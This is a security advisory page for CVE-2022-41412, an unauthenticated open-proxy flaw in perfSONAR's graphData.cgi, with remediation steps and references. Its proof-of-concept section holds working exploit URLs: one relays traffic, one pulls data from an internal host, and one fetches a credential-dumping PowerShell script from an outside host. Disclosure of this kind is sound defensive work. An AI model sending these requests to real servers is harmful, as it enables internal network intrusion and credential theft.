---
title: perfSONAR - v4.x < = v4.4.4 - Open Web Proxy (Unauthenticated)
url: https://cxsecurity.com/issue/WLB-2022120003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-02
fetch_date: 2025-10-04T00:16:01.203034
---

# perfSONAR - v4.x < = v4.4.4 - Open Web Proxy (Unauthenticated)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **perfSONAR - v4.x <= v4.4.4 - Open Web Proxy (Unauthenticated)** **2022.12.01**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [Ryan Moore](https://cxsecurity.com/author/Ryan%2BMoore/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-41412](https://cxsecurity.com/cveshow/CVE-2022-41412/ "Click to see CVE-2022-41412")**  CWE: **N/A** | |

https://github.com/renmizo/CVE-2022-41412
Vendor: perfSONAR
Link: https://github.com/perfsonar/
Affected Versions: v4.x <= v4.4.4
Vulnerability Type: Open Proxy Relay
Vulnerability Family: CGI Abuses
Discovered by: Ryan Moore
CVE: CVE-2022-41412
Summary
perfSONAR bundles with it a graphData.cgi script, used to graph and visualize data. There is a flaw in graphData.cgi allowing for unauthenticated users to proxy and relay HTTP/HTTPS traffic through the perfSONAR server. The vulnerability can potentially be leveraged to exfiltrate or enumerate data from internal web servers.
This vulnerability was patched in perfSONAR v4.4.5.
There is a whitelisting function that will mitigate, but is disabled by default.
Proof of Concept
Examples
Here are three examples of this vulnerability in use. To pass a regex match, the URL must include /esmond/perfsonar/archive/../../../ .
Example 1:
In this example, www.google.com is proxied through perfSONAR server.
https://192.168.68.145/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma\_data&url=https://www.google.com/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4
This is an image
Example 2:
In this example, sample data is exfiltrated from another adjacent internal web host, running an arbitrary port 4444.
https://192.168.68.145/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma\_data&url=http://192.168.68.113:4444/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4
Example 3:
In this example, we are able to download a malicious Powershell script through the perfSONAR server.
https://192.168.68.145/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma\_data&url=https://raw.githubusercontent.com/esmond/perfsonar/archive/../../../EmpireProject/Empire/master/data/module\_source/credentials/Invoke-PowerDump.ps1&src=8.8.8.8&dest=8.8.4.4
Remediation
Enable whitelisting in perfSONAR.
Update perfSONAR to 4.4.5 or newer.

**##### References:**

https://lists.internet2.edu/sympa/arc/perfsonar-user/2022-09/msg00030.html

https://github.com/perfsonar/graphs/commit/463e1d9dc30782d9b1c002143551ec78b74e03bb

https://www.perfsonar.net/releasenotes-2022-09-20-4-4-5.html

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41412

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top